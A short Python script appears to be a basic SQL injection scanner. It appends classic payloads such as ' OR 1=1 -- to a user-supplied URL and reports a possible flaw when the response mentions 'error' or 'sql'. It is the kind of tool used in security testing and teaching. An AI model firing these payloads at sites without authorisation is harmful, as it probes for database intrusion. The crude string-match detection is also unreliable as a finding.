import requests

url = input("Enter the URL to test for SQL injection: ")
payloads = ["'", "' OR 1=1 --", "' AND 1=0 --", "' OR 'a'='a", "' AND 'a'='b"]
print("Testing for SQL injection vulnerabilities...")

for payload in payloads:
    test_url = f"{url}{payload}"
    response = requests.get(test_url)
    if "error" in response.text or "sql" in response.text.lower():
        print(f"Possible SQL Injection vulnerability found with payload: {payload}")
        break
else:
    print("No vulnerabilities found.")
